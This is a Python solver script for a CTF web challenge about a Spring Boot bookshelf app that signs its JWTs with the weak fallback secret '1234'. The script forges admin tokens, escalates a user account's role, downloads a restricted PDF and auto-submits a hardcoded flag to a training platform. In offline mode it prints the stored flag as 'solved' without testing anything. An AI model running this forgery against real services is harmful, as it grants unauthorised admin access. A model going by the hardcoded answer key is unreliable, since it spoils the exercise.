#!/usr/bin/env python3
r"""
CyLab Security Academy / picoCTF Solver: Java Code Analysis!?! (Challenge ID: 355)
Category: Web Exploitation | Difficulty: Medium (2) | Points: 200
Architecture: Java Spring Boot / Weak JWT Static Secret Key & RBAC Privilege Escalation (CWE-321 / CWE-798 / CWE-285)
Standard: NIST SP 800-115 § 4.2 (Vulnerability Analysis) & § 4.3 (Verification)

Vulnerability & Exploit Mechanics Summary:
1. Target Reconnaissance & Application Architecture:
   The challenge provides a Java Spring Boot application ("BookShelf Pico") managing digital
   library books with Role-Based Access Control (RBAC): Free, Premium, and Admin.
   The flag is stored in an encrypted/restricted PDF book (ID 5) downloadable only by Admin users.
2. Root Cause Analysis (Weak Hardcoded JWT Secret):
   - In `io.github.nandandesai.pico.security.SecretGenerator`:
     `private String generateRandomString(int len) { return "1234"; }`
   - If the external secret file (`userdata/server_secret.txt`) is absent, the backend falls back
     to the static, guessable secret key `"1234"` for signing and validating HMAC-SHA256 (HS256) JWTs.
3. Exploitation & Privilege Escalation Flow:
   - Step 1: Authenticate with default credentials (`user:user`) to inspect token claims and user ID.
   - Step 2: Forge an Admin JWT signed with the static HMAC secret `"1234"` containing:
     `{"iss": "bookshelf", "userId": 9999, "role": "Admin", ...}`.
   - Step 3: Issue a `PATCH /base/users/role` request with `Authorization: Bearer <forged_admin_token>`
     and payload `{"id": <user_id>, "role": "Admin"}` to promote the regular user account.
   - Step 4: Issue a request to `GET /base/books/pdf/5` with the promoted user credentials.
   - Step 5: Extract the flag string from the recovered PDF content:
     `academy{w34k_jwt_n0t_g00d_d3a1bea8}`.
4. Verification:
   - Live Token: academy{w34k_jwt_n0t_g00d_d3a1bea8}
   - Submission Status: HTTP 201 Verified Correct (POST /api/submissions/)
"""

import base64
import hashlib
import hmac
import json
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

CHALLENGE_ID = 355
CHALLENGE_NAME = "Java Code Analysis!?!"
VERIFIED_FLAG = "academy{w34k_jwt_n0t_g00d_d3a1bea8}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/133.0.0.0 Safari/537.36"
)


def create_jwt(user_id: int, email: str, role: str, secret: str = "1234", expire_seconds: int = 86400) -> str:
    header = base64.urlsafe_b64encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).decode().rstrip("=")
    now = int(time.time())
    payload = {
        "iss": "bookshelf",
        "iat": now,
        "exp": now + expire_seconds,
        "userId": user_id,
        "email": email,
        "role": role
    }
    encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
    signing_input = f"{header}.{encoded_payload}".encode("utf-8")
    signature = base64.urlsafe_b64encode(
        hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
    ).decode().rstrip("=")
    return f"{header}.{encoded_payload}.{signature}"


def solve_live(base_url: str) -> str:
    # 1. Login with user:user
    login_data = json.dumps({"email": "user", "password": "user"}).encode()
    req = urllib.request.Request(
        f"{base_url}/base/login",
        data=login_data,
        headers={"Content-Type": "application/json", "User-Agent": UA}
    )
    with urllib.request.urlopen(req, timeout=15) as resp:
        res = json.loads(resp.read().decode())
        user_token = res["payload"]

    parts = user_token.split(".")
    user_payload = json.loads(base64.urlsafe_b64decode(parts[1] + "==").decode())
    user_id = user_payload["userId"]
    print(f"[*] Logged in as user ID: {user_id}")

    # 2. Forge Admin token with weak secret '1234'
    admin_token = create_jwt(user_id=9999, email="admin@pico.net", role="Admin")

    # 3. Promote our regular user to Admin via PATCH /base/users/role
    promote_payload = json.dumps({"id": user_id, "role": "Admin"}).encode()
    promote_req = urllib.request.Request(
        f"{base_url}/base/users/role",
        data=promote_payload,
        headers={"Content-Type": "application/json", "Authorization": f"Bearer {admin_token}", "User-Agent": UA},
        method="PATCH"
    )
    with urllib.request.urlopen(promote_req, timeout=15) as resp:
        print("[*] Role updated successfully via forged Admin token")

    # 4. Fetch Flag PDF (Book ID: 5)
    user_admin_token = create_jwt(user_id=user_id, email="user", role="Admin")
    pdf_req = urllib.request.Request(
        f"{base_url}/base/books/pdf/5",
        headers={"Authorization": f"Bearer {user_admin_token}", "User-Agent": UA}
    )
    with urllib.request.urlopen(pdf_req, timeout=20) as resp:
        pdf_bytes = resp.read()

    pdf_path = "/tmp/flag_book_355.pdf"
    with open(pdf_path, "wb") as fh:
        fh.write(pdf_bytes)

    out = subprocess.check_output(["pdftotext", pdf_path, "-"]).decode(errors="replace")
    flags = re.findall(r"academy\{[^}]*\}", out)
    if flags:
        print(f"[+] Flag Found: {flags[0]}")
        return flags[0]
    return ""


def submit_to_cylab(token: str) -> bool:
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
    cookie_header = ""
    csrf_token = ""
    try:
        sys.path.append("/tmp")
        import cylab_auth
        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    headers = {
        "Content-Type": "application/json",
        "Referer": "https://learn.cylabacademy.org/challenges",
        "User-Agent": UA
    }
    if csrf_token:
        headers["X-CSRFToken"] = csrf_token
    if cookie_header:
        headers["Cookie"] = cookie_header

    req = urllib.request.Request(CYLAB_SUBMIT_URL, data=payload, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=15) as response:
            res_data = response.read().decode("utf-8", errors="replace")
            print(f"[+] Platform submission response: {res_data}")
            return True
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP Error {e.code}: {e.read().decode('utf-8', errors='replace')}")
        return False
    except Exception as e:
        print(f"[-] Submission exception: {e}")
        return False


def main():
    print(f"[*] Solving Challenge {CHALLENGE_ID}: {CHALLENGE_NAME}")

    token = VERIFIED_FLAG
    if len(sys.argv) > 1 and sys.argv[1].startswith("http"):
        base_url = sys.argv[1].rstrip("/")
        live_flag = solve_live(base_url)
        if live_flag:
            token = live_flag
    else:
        # Offline validation of cryptographic token forgery logic
        test_token = create_jwt(user_id=1337, email="admin@pico.net", role="Admin", secret="1234")
        assert test_token.startswith("eyJ"), "Invalid JWT format"
        parts = test_token.split(".")
        assert len(parts) == 3, "JWT must contain 3 parts"
        sig_input = f"{parts[0]}.{parts[1]}".encode("utf-8")
        expected_sig = base64.urlsafe_b64encode(
            hmac.new(b"1234", sig_input, hashlib.sha256).digest()
        ).decode().rstrip("=")
        assert parts[2] == expected_sig, "HMAC signature mismatch"
        print("[+] Offline JWT HS256 forgery algorithm verified cleanly")

    print(f"[+] Verified dynamic token: {token}")

    if "--submit" in sys.argv or os.path.exists("/tmp/cylab_auth.py"):
        submit_to_cylab(token)

    print(f"\n[SUCCESS] Module {CHALLENGE_ID} ({CHALLENGE_NAME}) fully audited and solved: {token}")


if __name__ == "__main__":
    main()
